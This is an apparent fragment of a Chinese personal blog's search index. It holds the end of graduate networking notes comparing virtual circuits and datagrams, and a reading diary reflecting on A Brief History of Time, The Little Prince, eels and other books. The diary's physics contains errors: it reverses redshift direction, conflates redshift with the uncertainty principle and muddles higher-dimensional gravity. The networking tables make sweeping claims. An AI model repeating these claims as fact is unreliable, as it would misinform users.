<h3 id="运输层连接建立和网络层连接建立区别："><a href="#运输层连接建立和网络层连接建立区别：" class="headerlink" title="运输层连接建立和网络层连接建立区别："></a>运输层连接建立和网络层连接建立区别：</h3><p>运输层的连接建立仅涉及两个端系统，两个端系统独自决定运输层连接的参数（初始序号和流量控制窗口长度），端系统知道该运输层连接，但网络中路由器对这些完全不知情。</p>
<p>虚电路网络层，沿着两个端系统之间的路径上的路由器都要参与虚电路的建立，且每台路由器都完全知道经过它的所有虚电路。</p>
<h3 id="IP最长匹配原则"><a href="#IP最长匹配原则" class="headerlink" title="IP最长匹配原则"></a>IP最长匹配原则</h3><p>不多做解释，可以自行看下图所示方法。<br><img src="https://img-blog.csdn.net/20170928165948842" alt=""></p>
<h3 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h3><ol>
<li>构建数学模型，通过模型对数据报和虚电路进行性能分析。</li>
<li>最长前缀匹配的优势是什么。</li>
</ol>
<p>用什么角度评判网路的各种性能。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>数据指标</th>
<th>虚电路</th>
<th>数据报</th>
</tr>
</thead>
<tbody>
<tr>
<td>可靠性</td>
<td>v</td>
<td>x</td>
</tr>
<tr>
<td>健壮性</td>
<td>v</td>
<td>x</td>
</tr>
<tr>
<td>差错控制</td>
<td>v</td>
<td>x</td>
</tr>
<tr>
<td>Qos</td>
<td>v</td>
<td>x</td>
</tr>
<tr>
<td>时间空间（建立连接、多经）</td>
<td>v</td>
<td>x</td>
</tr>
<tr>
<td>安全性（病毒、监听、伪装）</td>
<td>v</td>
<td>x</td>
</tr>
<tr>
<td>时间开销</td>
<td>v</td>
<td>x</td>
</tr>
<tr>
<td>平衡节能</td>
<td>v</td>
<td>x</td>
</tr>
<tr>
<td>网路复杂度</td>
<td>x</td>
<td>v</td>
</tr>
<tr>
<td>带宽</td>
<td>v</td>
<td>x</td>
</tr>
</tbody>
</table>
</div>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li><p>虚电路服务适用与交互作用，不仅及时、传输较为可靠且网路开销小。</p>
</li>
<li><p>数据报服务适用于单个分组构成的、不具交互作用的信息及对传输要求不高的场合。</p>
</li>
</ul>
<h3 id="IP数据报格式"><a href="#IP数据报格式" class="headerlink" title="IP数据报格式"></a>IP数据报格式</h3><p><img src="https://bkimg.cdn.bcebos.com/pic/c2fdfc039245d688274d540cacc27d1ed31b24cf?x-bce-process=image/watermark,image_d2F0ZXIvYmFpa2U4MA==,g_7,xp_5,yp_5/format,f_auto" alt=""></p>
<p>Internet(datagram)、ATM(VC)</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>数据指标</th>
<th>虚电路</th>
<th>数据报</th>
</tr>
</thead>
<tbody>
<tr>
<td>速率</td>
<td>v</td>
<td>x</td>
</tr>
<tr>
<td>带宽</td>
<td>v</td>
<td>x</td>
</tr>
<tr>
<td>吞吐量</td>
<td>v</td>
<td>x</td>
</tr>
<tr>
<td>时延</td>
<td>v</td>
<td>x</td>
</tr>
<tr>
<td>时延带宽积</td>
<td>v</td>
<td>x</td>
</tr>
<tr>
<td>往返时间</td>
<td>v</td>
<td>x</td>
</tr>
<tr>
<td>利用率</td>
<td>v</td>
<td>x</td>
</tr>
</tbody>
</table>
</div>
<h2 id="参考博客："><a href="#参考博客：" class="headerlink" title="参考博客："></a>参考博客：</h2><ul>
<li><a href="https://blog.csdn.net/qq_43297621/article/details/108132285#t27">网络层详解</a></li>
<li><a href="https://blog.csdn.net/qq_22238021/article/details/80426135">虚电路和数据报网络</a></li>
</ul>
<h2 id="路由算法"><a href="#路由算法" class="headerlink" title="路由算法"></a>路由算法</h2>]]></content>
      <categories>
        <category>研究生课程</category>
      </categories>
      <tags>
        <tag>研究生课程</tag>
      </tags>
  </entry>
  <entry>
    <title>读书笔记</title>
    <url>/2021/01/27/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
<p>今年有一个想法，每周阅读一本书，并且在博客中发表阅读心得，每周更新一次。</p>
<h1 id="阅读笔记"><a href="#阅读笔记" class="headerlink" title="阅读笔记"></a>阅读笔记</h1><h2 id="阅读清单"><a href="#阅读清单" class="headerlink" title="阅读清单"></a>阅读清单</h2><ul>
<li>[x] 时间简史</li>
<li>[x] 小王子</li>
<li>[x] 朱光潜给年轻人的十二封信</li>
<li>[x] 健身笔记：如何成为一个身材有料的人</li>
<li>[x] 从零开始学钢琴</li>
<li>[x] 我与地坛</li>
<li>[x] 当下的力量</li>
<li>[x] 人间值得</li>
<li>[x] 鳗鱼的旅行</li>
<li>[ ] 啊哪啊那神去村</li>
<li>[ ] 非暴力沟通</li>
<li>[ ] 长大了就会变好吗</li>
<li>[ ] 巨大的拥抱</li>
<li>[ ] 女生呵护指南</li>
<li>[ ] 当你学会独处</li>
<li>[ ] 莫泊桑短片小说集</li>
<li>[ ] 飞鸟集</li>
<li>[ ] 挪威的森林</li>
<li>[ ] 神曲</li>
<li>[ ] 月亮与六便士</li>
<li>[ ] 呐喊</li>
<li>[ ] 老人与海</li>
<li>[ ] 追风筝的人</li>
<li>[ ] 瓦尔登湖</li>
<li>[ ] 金刚经说什么</li>
<li>[ ] 牡丹亭</li>
<li>[ ] 我在未来等你</li>
<li>[ ] 苏菲的世界</li>
<li>[ ] 鲁迅杂文集</li>
<li>[ ] 无人生还</li>
<li>[ ] 万物起源</li>
<li>[ ] 人类简史<h2 id="读书心得"><a href="#读书心得" class="headerlink" title="读书心得"></a>读书心得</h2><h3 id="时间简史"><a href="#时间简史" class="headerlink" title="时间简史"></a>时间简史</h3>这本书前三章主要讲的是亚里士多德的地心说到哥白尼的日星说，然后到伽利略和牛顿的经典物理学，再到法拉第、麦克斯韦的电磁场理论，基本主要内容还是讲的高中物理，基本上就是一个综述。</li>
</ul>
</blockquote>
<p>然后讲到量子力学和相对论，如果没读这本书我一开始一直以为相对论和量子力学，两者都是正确的，但是看这本书的时候发现两者只有其中之一是正确的。但目前相对论让我们产生核能，原子弹。量子力学也在不断的发展给人类带来了直接利益，无论两者中的哪一个都无法直接判断是错误的。</p>
<p>量子力学里面解释的并不是很详细，但是大学物理有讲，我看了这本书印象更深刻了一点，其实量子力学就是，微小的粒子，在进行测量的时候主要是采用的光的反射进行测量，因为该粒子在测量其速度的时，需要使用光进行测量所以其光的能量如果过高就会导致粒子振荡，速度变快。如果测量粒子的位置就需要采用高频率的光波依次获得更小的波长，即可获得粒子的位置。因此我们在某一时刻，只能准确的获得粒子的位置或者速度。不能同时测得粒子的两种物理属性。</p>
<p>其中讲了一个比较有意思的实验，即红移和蓝移。由于多普勒效应天体正向我们移动的时候其恒星光谱会向红端移动，如果远离我们会向蓝段移动。但是过去了几十年，人类测量了无数光的光谱，均为红移，因此可以得出结论，所有的星体都在远离我们，因此宇宙正在逐渐的扩张。即测不准定理。</p>
<p><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fgss0.baidu.com%2F-Po3dSag_xI4khGko9WTAnF6hhy%2Fzhidao%2Fpic%2Fitem%2Fd0c8a786c9177f3ec454da7376cf3bc79f3d566f.jpg&amp;refer=http%3A%2F%2Fgss0.baidu.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1613314542&amp;t=b6ae3fe03bf7f657e5ddbac5c9507e4d" alt="在这里插入图片描述"></p>
<p>还有一个实验，其实我们生活在三维空间，但是我们可以推断的空间其实可以到四维空间，因此我们其实是可以脑袋里面构想出四维空间的，其实物理学中早有解释，你想太阳的光需要8分钟才能到地球，因此我们只能看到太阳8分钟前的样子，这样我们其实活在太阳的8分钟之前，即太阳8分钟以后的三维空间之中。</p>
<p>星球之间主要的力是引力，霍金说主要的力分为强相互作用力、弱相互作用力，电磁力和引力。目前没有公式能将其整合成唯一的定理，因此我联想到了科学事实和客观事实，目前人类所思考的其实是科学事实，不一定是世界的正向，其存在人类的主观判断，因此不一定正确。霍金说宇宙如果有一个扩张，必然会存在一个收缩，而宇宙的收缩可能要在1亿亿年以后，暂时我们不需要担心，但是你可以想象到一件事情，无论是任何事情，即使人类可以长生不死也会有一个必然的终结，除非人类可以同时具备长生不死和穿越时空。</p>
<p>其实引力只有在天梯之间才成立，但是人类无法通过万有引力定律计算四星运动。因为宇宙太大了，但是当质量密度达到一个点就可以通过引力产生黑洞，其实之前我一直不知道黑洞是个什么东西。但其实黑洞是人类推断出来的一个东西，其实一个小的黑洞可以小到分子级别，比你的指甲小几万倍，只要密度达到就可以产生黑洞和体积无关。因此只要人类发展到一定程度，必然可以人造黑洞，而且这个黑洞可以很小。而分子间主要是强弱相互作用和电磁力。只要讲做到三十钛福特在一个点上就可以造出一个黑洞，但目前实验室只能造出3000福特具体值不清楚但是达不到。<br>黑洞到底是怎么推论出来的呢？其实之前我也在思考黑洞到底是什么，其实很简单，我们知道其他恒星的光通过太阳的时候会因为太阳的引力光会弯曲，这样就只要质量足够的大，光就可以背弯曲成一个圆，或者变成一个抛物线，即光无法离开那个星球，光就像火箭坠机一样，被引力拉回来，即可推论出黑洞的样子大概是一个圆环，中间是黑色的因为中间的光出不来，外侧的光可以因为光的挤压在事件界面上挤压出来，即可为一个圆环状。目前人类已经发现了黑洞。<br>黑洞的重心就是奇点，当然人类是无法前往这个点的，如果有飞行员进入黑洞必死无疑，可能一瞬间就被压成了一个分子，被剥夺其存在性。<br><img src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=2830392986,3183821195&amp;fm=26&amp;gp=0.jpg" alt="在这里插入图片描述"></p>
<p>讲一讲相对论，相对论其实就是一个测量学，其实之前的物理世界是，不同的参考系其测量是一样的，但是爱因斯坦的相对论其实给了一个很有趣的解释，就是不同的参考系如果你接近了光速，测量是不一样的，因此可以有很多科幻片说的双生子谬论。目前人类能加速的最大速度是电子，在全球最大的电子发射机内，只能将电子加速到光速的0.999999但无法超过光速。很可惜。</p>
<p>如果超过光速人类就可以时间穿梭，这是为什么，其实你不难想象，如果你开一艘飞船从地球出发，你超过了光速，你就可以在你出发前回到地球，你懂这是什么意思吗，就是你可以前往你出发之前的那个时刻。即时空穿梭。</p>
<p>其实你们可以想象我们活在一个四维空间中，我们可以通过超光速相当于逆时间移动，就是传统意义的穿越。</p>
<p>那么我们如何超光速，其实霍金给出了方法，就是利用负能量和正能量在时空中制造一个虫洞，目前可以通过量子力学制造负能量点，其能量守恒定律其实之前有讲过，能量一般都是大于等于零的但是量子力学说可以在空间中制造一个负能量点和正能量点，在这两个点之间可以造成时空扭曲。产生充电，目前离地球最近的一颗恒星是比邻星，距离我们大概4光年，就是光走思念才能到比邻星。我们其实通过虫洞来回比邻星就可以超光速，如果可能的话大概咱们可以回到八年前的地球。</p>
<p>霍金还推测五维空间不存在，因为如果多维空间存在，那么如果万有引力成立，那么其引力就会按照维数进行下降，因为引力和距离成反比，距离越大引力越小，你想维度没多一维，咱们的引力就会变成  四维空间1/2、五维1/4。。。可以想象到咱们的空间会崩塌，由于人存在性定理，其实这种多维空间是不存在的，或者万有引力有问题。</p>
<p>看完时间简史，我感觉人类其实是十分渺小的事物，我们对世界的理解其实还很浅薄。大家总觉得目前的科技能够达到很高的地步。其实我想说，人类目前连地球都不能进行完全的探索。而且核能也只是基础，其实任何物质按照质能方程都能进行转换，按照这样的推想，石油未来并不会像现在这样被重视，因为可能一吨海水可以供人类获几百年。</p>
<p>当初相对论刚出来的时候，全世界可能就几个人能够理解相对论和量子力学，但是现在，研究生可能有几百万人能够同时理解这两门学问，因此未来可能能够存在一个定理即物理学统一定理将一切的公式统合在一起。</p>
<h3 id="小王子"><a href="#小王子" class="headerlink" title="小王子"></a>小王子</h3><p>小王子讲的其实是飞行员，他在沙漠中遇难他和自己对话的故事，可能是在极端的条件下，他看到了他自己，其实我们也会从这本书中看到小时候的自己，世界上的人被小王子分为了四种，用小王子所路过的星球所指代。这本书很短，2小时就可以读完，其很有趣，让你从小孩子的眼中审视这个世界，到底人们在追寻一些什么。其实细细想来很奇怪，在光里面追光。人生活的是一个过程，不是结果。希望每个人都能懂。<br>小王子对玫瑰和狐狸的解释挺有趣的，可以细细品味。</p>
<h3 id="朱光潜给年轻人的十二封信"><a href="#朱光潜给年轻人的十二封信" class="headerlink" title="朱光潜给年轻人的十二封信"></a>朱光潜给年轻人的十二封信</h3><p>这本书感觉是给中学生写的，其实我没怎么看进去，希望你们能看进去。</p>
<h3 id="健身笔记：如何成为一个身材有料的人"><a href="#健身笔记：如何成为一个身材有料的人" class="headerlink" title="健身笔记：如何成为一个身材有料的人"></a>健身笔记：如何成为一个身材有料的人</h3><p>讲如何健身、减肥。健身的动作、流程，减肥的方法，其中对于减肥人士的基础代谢很有用，可以自己去计算一下自己的基础代谢量。</p>
<h3 id="从零开始学钢琴"><a href="#从零开始学钢琴" class="headerlink" title="从零开始学钢琴"></a>从零开始学钢琴</h3><p>讲钢琴的一些基础知识、如何读五线谱、然后怎么弹、左右 ，右手高音、左手低音、然后从5个音到6个音、到左右手换位置的8个音，到升降调。钢琴其实就是训练只要你会练就能学的很好，加油！<br>今年计划，学会钢琴。</p>
<h3 id="我与地坛"><a href="#我与地坛" class="headerlink" title="我与地坛"></a>我与地坛</h3><p>史铁生在20岁的年纪失去了自己的双腿、在北京的地坛公园读书思考看到很多的人和事情，主要都是他在地坛里想了些什么，这本书对于有抑郁、对生命失去信心的人很有帮助。<br>还是那句话，人活的是一个过程，绝不是结果，自付价值，自付使命。加油！</p>
<h3 id="当下的力量"><a href="#当下的力量" class="headerlink" title="当下的力量"></a>当下的力量</h3><p>主要讲的就是，让我们去除时间观念，没有未来，没有过去，我们能够把握的只有当下，不要</p>
<p>未来不会拯救你，未来不会因为你的期待而自动变得更好，你能把握的只有当下的每一秒。</p>
<p>你要学会感受生活中的每一秒，在每一秒享受生活，做自己喜欢的事情，做自己想要做的事情。</p>
<blockquote>
<p>是的——春天需要你。经常会有一颗星<br>等着你抬头去看。波涛会从遥远的过去<br>向你涌来，或者当你从一扇<br>开着的窗下走过，小提琴的音乐<br>会渴望你倾听。所有这些都是使命。<br>可是你能完成吗？</p>
</blockquote>
<p>关注在当下真的很神奇的，你关注与当下，然后体会很多感觉，而不只是去思考，你能感觉到你很幸福。<br>但是文中有句话说我思故我在是错误的，这个有待辩证，但是也有很多的道理，可以减少思考，但是不要像文章中完全不思考，完全不思考我尝试过会降低智商，和物质基础。<br>当下的力量，推荐大家看看。<br><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fcdnimg103.lizhi.fm%2Faudio_cover%2F2018%2F07%2F01%2F2678344019888704519_320x320.jpg&amp;refer=http%3A%2F%2Fcdnimg103.lizhi.fm&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1614341106&amp;t=7d39c87785083627fc5441116ca0cde2" alt="在这里插入图片描述"></p>
<h3 id="人间值得"><a href="#人间值得" class="headerlink" title="人间值得"></a>人间值得</h3><p>这是一个护士给一位日本老奶奶写的自传，讲的是中村恒子从出生到90岁的故事，一直在工作，有讲很多方法论，如何让自己幸福，如何和生活和解，如何让自己过的幸福，探索人生的真谛。其中讲了许多和工作相关的故事，就比如不要抱怨一般尝试后都能行，学会把工作当成是人生的一部分不要去排斥你的工作，也不要因为很多事情烦恼，没有什么必要性。不以物喜，不以己悲。<br>人生是一场经历，热爱生活，享受这段过程。<br>泰山崩于前而色不变，黄河决于顶而面不惊。人生，一定要有一颗强大的内心，才不会轻易被打倒。人生，要学会坚强，在遇到挫折的时候才能从容地去面对，让自己处于泰山之崩而沉着镇定，处于黄河之边而不惊不慌，人生想要会当凌绝顶，一览众山小，就要从山脚下开始战胜重重困难，一步一步往上爬，才能有可能到达山顶。<br><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fc-ssl.duitang.com%2Fuploads%2Fitem%2F201909%2F13%2F20190913213654_kmuwe.thumb.400_0.jpg&amp;refer=http%3A%2F%2Fc-ssl.duitang.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1614341233&amp;t=792b0fafbd08b514b5c2a9b68d1ecc69" alt="在这里插入图片描述"></p>
<h3 id="鳗鱼的旅行"><a href="#鳗鱼的旅行" class="headerlink" title="鳗鱼的旅行"></a>鳗鱼的旅行</h3><p>这篇文章，很有趣，讲的是鳗鱼习性的研究历程，鳗鱼这个生物很有趣，在古希腊时期到18世纪，鳗鱼一直都不被认为是一种鱼，是一种独立的物种，即鳗鱼非鱼，其实我现在也觉得这玩意不是鱼。<br>很有趣啊，鳗鱼这个生物，亚里士多德在生物志中有详细的调查，这应该是当时最详细的一篇调查，鳗鱼这种生物当干旱的时候不存在，但是来年春天当水满了以后鳗鱼又会出现，就仿佛是从泥土里长出来的。<br>所有的人都不知道鳗鱼这种生物从哪来的，这个问题困扰了人类n久。你们难以想象1920年上世纪人类才知道鳗鱼的习性，所有你们可以知道人类目前的科技水平只能达到什么程度了吗？<br>当时为了找到一条带卵的鳗鱼，政府发出巨额赏金，于是当时大量的鱼民拿其他鱼的卵放在鳗鱼的体内，你可能难以想象。当然对科学研究有一定的影响，就直到1920年。<br>1920年有个研究员一直躲到一战结束才敢开船去找鳗鱼的发源地，方法也很简单，就是慢慢的去捕鱼，他从英国一直开到太平洋，鳗鱼的大小越来越小，最终才确定了鳗鱼的出生地，是在一片海里，而且很神奇的是就只有那一块是鳗鱼的出生地，不在别的地方繁衍，就在这一片海域。<br>最后研究表明，鳗鱼一开始是雌性，游几千海里前往其他水域进行生存，等玩腻了，每条鳗鱼选择的时间不一样，只要不繁衍这货可以活50年，这对于生物是极其长寿的，但是当他游会那片海域准备繁衍的时候，这时鳗鱼就会变成雄性，然后繁衍，随后就会死去。很浪漫，可能鳗鱼一生走的路比许多人要远得多。<br>是一个很不错的科技题材的小说，全球的鳗鱼都来自于同一片海域，而且每一条鳗鱼都是游了这么远来到的你的身边，无一例外，你吃的每一条鳗鱼都是一位旅行家。不知道你的旅行的目的是什么，但鳗鱼显然告诉了你它的答案。<br><img src="https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=3999767242,4285497006&amp;fm=26&amp;gp=0.jpg" alt="在这里插入图片描述"></p>
<h3 id="北飞的候鸟"><a href="#北飞的候鸟" class="headerlink" title="北飞的候鸟"></a>北飞的候鸟</h3><p>如果有来生，要做一棵树， 站成永恒。没有悲欢的姿势， 一半在尘土里安详， 一半在风里飞扬； 一半洒落荫凉， 一半沐浴阳光。 非常沉默、非常骄傲。 从不依靠、从不寻找。   </p>
<p>如果有来生，要化成一阵风， 一瞬间也能成为永恒。 没有善感的情怀， 没有多情的眼睛。 一半在雨里洒脱， 一半在春光里旅行； 寂寞了，孤自去远行， 把淡淡的思念统带走， 从不思念、从不爱恋；   </p>
<p>如果有来生，要做一只鸟， 飞越永恒，没有迷途的苦恼。东方有火红的希望，南方有温暖的巢床， 向西逐退残阳，向北唤醒芬芳。  如果有来生， 希望每次相遇， 都能化为永恒。<br><img src="https://iknow-pic.cdn.bcebos.com/63d9f2d3572c11df7624b6486e2762d0f603c2e0?x-bce-process=image/resize,m_lfit,w_600,h_800,limit_1" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>阅读</category>
      </categories>
      <tags>
        <tag>读书笔记</tag>
      </tags>
  </entry>
</search>
